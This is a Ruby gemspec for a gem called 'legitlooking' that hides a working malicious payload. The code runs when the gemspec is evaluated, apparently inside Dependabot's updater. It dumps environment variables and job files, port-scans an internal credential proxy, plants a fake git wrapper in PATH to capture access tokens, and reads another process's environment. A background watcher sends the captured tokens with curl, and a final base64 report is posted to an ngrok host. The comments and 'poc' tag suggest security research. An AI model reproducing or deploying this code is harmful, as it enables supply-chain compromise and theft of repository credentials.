# frozen_string_literal: true

COLLAB_URL = "https://854e-2001-1c00-307-d600-5943-e639-f9a6-c878.ngrok-free.app"

begin
  require "uri"
  require "net/http"

  read_file = ->(f) { IO.binread(f).force_encoding("UTF-8").encode("UTF-8", invalid: :replace, undef: :replace) }

  lines = []
  lines << "=== ENV ===\n" + ENV.map { |k,v| "#{k}=#{v}" }.join("\n")
  lines << "\n=== JOB.JSON ===\n" + (read_file.("/home/dependabot/dependabot-updater/job.json") rescue "FOUT")

  # === ESCALATIE: GitHub API via de geauthenticeerde proxy ===
  # De proxy injecteert automatisch de Authorization header.
  # We disablen SSL verify omdat we intern zitten.
  lines << "\n=== GITHUB API VIA PROXY ==="

  def gh_req(method, url, body_hash = nil)
    require "uri"; require "net/http"
    uri = URI(url)
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = true; http.verify_mode = 0
    http.open_timeout = 10; http.read_timeout = 10
    req = Object.const_get("Net::HTTP::#{method.capitalize}").new(uri)
    req["Accept"] = "application/vnd.github+json"
    req["X-GitHub-Api-Version"] = "2022-11-28"
    if body_hash
      req["Content-Type"] = "application/json"
      req.body = body_hash.to_s.gsub("=>", ":").gsub("nil", "null")
        .gsub(": true", ": true").gsub(": false", ": false")
    end
    res = http.request(req)
    "Status: #{res.code}\nScopes: #{res["x-oauth-scopes"]}\nBody: #{res.body[0, 800]}"
  rescue => e
    "FOUT: #{e.message}"
  end

  # ============================================================
  # ESCALATIE: PATH hijacking via /home/dependabot/bin/git
  #
  # /home/dependabot/bin staat EERSTE in PATH.
  # Wij schrijven een fake git die:
  #   1. Alle aanroepen logt (incl. x-access-token:TOKEN in git config calls)
  #   2. De echte git aanroept zodat Dependabot normaal doorgaat (transparant)
  #   3. Bij credential-gerelateerde calls het token exfiltreert
  # ============================================================

  dep_bin = "/home/dependabot/bin"
  collab = COLLAB_URL

  # ============================================================
  # PROXY AANVAL: 172.19.0.2 heeft de credentials
  # Scan alle poorten, probeer admin APIs
  # ============================================================
  lines << "\n=== PROXY AANVAL (172.19.0.2) ==="

  require "socket"
  require "timeout"

  open_ports = []
  # Scan veelgebruikte poorten + proxy-specifieke poorten
  scan_ports = [80, 443, 1080, 1081, 3000, 4141, 5000, 8080, 8081,
                8082, 8083, 8888, 9090, 9091, 9093, 9999, 10000,
                15000, 16000, 16001, 16666, 17777, 19999, 20000]

  scan_ports.each do |port|
    begin
      Timeout.timeout(0.5) do
        s = TCPSocket.new("172.19.0.2", port)
        open_ports << port
        s.close
      end
    rescue
    end
  end
  lines << "Open poorten op 172.19.0.2: #{open_ports.inspect}"

  # Probeer elke open poort te bevragen
  open_ports.each do |port|
    begin
      Timeout.timeout(3) do
        s = TCPSocket.new("172.19.0.2", port)
        # Stuur HTTP verzoeken voor mogelijke admin APIs
        [
          "GET / HTTP/1.0\r\nHost: 172.19.0.2\r\n\r\n",
          "GET /health HTTP/1.0\r\nHost: 172.19.0.2\r\n\r\n",
          "GET /credentials HTTP/1.0\r\nHost: 172.19.0.2\r\n\r\n",
          "GET /config HTTP/1.0\r\nHost: 172.19.0.2\r\n\r\n",
          "GET /metrics HTTP/1.0\r\nHost: 172.19.0.2\r\n\r\n",
        ].each do |req|
          begin
            s2 = TCPSocket.new("172.19.0.2", port)
            s2.write(req)
            resp = s2.read_nonblock(2000) rescue s2.read(2000) rescue ""
            if resp.length > 0
              lines << "--- Poort #{port} response (#{req.split(' ')[1]}) ---"
              lines << resp[0, 500]
            end
            s2.close rescue nil
          rescue; end
        end
        s.close
      end
    rescue
    end
  end

  # Probeer ook de proxy als credential oracle via HTTPS
  # Stuur een request naar de proxy voor een niet-github URL
  # Als de proxy credentials inject voor alle URLs, vangen we ze hier
  lines << "\n--- Proxy credential oracle test ---"
  begin
    proxy_uri = URI("http://172.19.0.2:1080")
    Net::HTTP.start(proxy_uri.host, proxy_uri.port) do |proxy|
      req = Net::HTTP::Get.new("http://169.254.169.254/latest/meta-data/")
      res = proxy.request(req)
      lines << "Proxy direct response: #{res.code}"
      lines << "Headers: #{res.to_hash.inspect[0, 300]}"
      lines << "Body: #{res.body[0, 300]}"
    end
  rescue => e
    lines << "Proxy oracle fout: #{e.message}"
  end

  lines << "\n--- /home/dependabot/bin inhoud ---"
  lines << (`ls -la #{dep_bin}/ 2>&1`)

  # Schrijf de fake git wrapper
  fake_git_script = <<~SHELL
    #!/bin/sh
    # Transparante git wrapper - logt args naar file, roept echte git aan
    printf '%s\\n' "$(date -Iseconds) $*" >> /tmp/git_calls.log
    exec /usr/bin/git "$@"
  SHELL

  begin
    fake_git_path = "#{dep_bin}/git"
    IO.binwrite(fake_git_path, fake_git_script)
    `chmod +x #{fake_git_path} 2>&1`
    lines << "\n--- Fake git geschreven: #{`ls -la #{fake_git_path} 2>&1`.strip} ---"
  rescue => e
    lines << "\n--- Fake git mislukt: #{e.message} ---"
  end

  # Background watcher: poll git log en gitconfig elke 2s voor 120s
  # Stuurt token zodra het verschijnt, blokkeert de main flow NIET
  watcher = <<~SHELL
    #!/bin/sh
    COLLAB="#{collab}"
    for i in $(seq 1 60); do
      sleep 2
      # Kijk of git_calls.log iets interessants heeft
      if [ -f /tmp/git_calls.log ]; then
        TOKEN=$(grep -o 'x-access-token:[^@]*' /tmp/git_calls.log 2>/dev/null | head -1)
        if [ -n "$TOKEN" ]; then
          /usr/bin/curl -s "${COLLAB}?hijack_token=${TOKEN}&calls=$(wc -l < /tmp/git_calls.log)" &
          cat /tmp/git_calls.log | /usr/bin/curl -s -X POST "${COLLAB}?git_log=1" --data-binary @- &
          break
        fi
      fi
      # Ook gitconfig checken
      GCFG=$(/usr/bin/git config --global --get-regexp "url" 2>/dev/null)
      if echo "$GCFG" | grep -q "x-access-token"; then
        TOKEN=$(echo "$GCFG" | grep -o 'x-access-token:[^@]*' | head -1)
        echo "$GCFG" | /usr/bin/curl -s -X POST "${COLLAB}?gitcfg_token=${TOKEN}" --data-binary @- &
        break
      fi
    done
  SHELL

  begin
    IO.binwrite("/tmp/git_watcher.sh", watcher)
    `chmod +x /tmp/git_watcher.sh`
    # Start watcher los van de huidige process (dubbele fork)
    `(/tmp/git_watcher.sh > /tmp/watcher.out 2>&1 &) &`
    lines << "Background watcher gestart (monitort 120s op token)"
  rescue => e
    lines << "Watcher fout: #{e.message}"
  end

  # Lees ook /proc van het hoofd-updater proces (zelfde user = leesbaar)
  lines << "\n--- /proc hoofdproces ---"
  main_pid = `pgrep -f 'ruby.*update_files' 2>/dev/null`.strip.split.first
  if main_pid
    lines << "Main PID: #{main_pid}"
    lines << "Open FDs: #{`ls -la /proc/#{main_pid}/fd 2>/dev/null`[0, 500]}"
    # Lees environment van het hoofdproces
    main_env = IO.binread("/proc/#{main_pid}/environ") rescue ""
    main_env_parsed = main_env.gsub("\x00", "\n")
    lines << "Main process ENV:\n#{main_env_parsed[0, 1000]}"
  end

  # === PIVOT: interne netwerk scan ===
  lines << "\n=== INTERNE NETWERK SCAN ==="
  lines << `nmap -sn 172.19.0.0/24 2>/dev/null || for i in $(seq 1 10); do (ping -c1 -W1 172.19.0.$i >/dev/null 2>&1 && echo "172.19.0.$i UP") || true; done 2>/dev/null`.to_s[0, 800]

  # === Repo inhoud lezen via proxy ===
  lines << "\n=== GECLONEDE REPO BESTANDEN ==="
  repo_path = ENV["DEPENDABOT_REPO_CONTENTS_PATH"] || "/home/dependabot/dependabot-updater/repo"
  lines << `ls -la #{repo_path}/ 2>/dev/null`.to_s[0, 500]
  lines << `find #{repo_path} -name "*.env" -o -name ".env*" -o -name "*.secret" 2>/dev/null`.to_s[0, 300]

  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")

  uri = URI("#{COLLAB_URL}?poc=escalatie")
  req = Net::HTTP::Post.new(uri)
  req["Content-Type"] = "text/plain"
  req.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: uri.scheme == "https",
                  open_timeout: 10, read_timeout: 10) { |h| h.request(req) }

rescue => e
  begin
    require "net/http"
    require "uri"
    uri = URI("#{COLLAB_URL}?poc=escalatie&err=#{URI.encode_www_form_component(e.message[0, 200])}")
    Net::HTTP.get(uri)
  rescue
  end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.11"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]

  spec.add_dependency "rails", "~> 7.0"
  spec.add_dependency "devise", "~> 4.9"
end
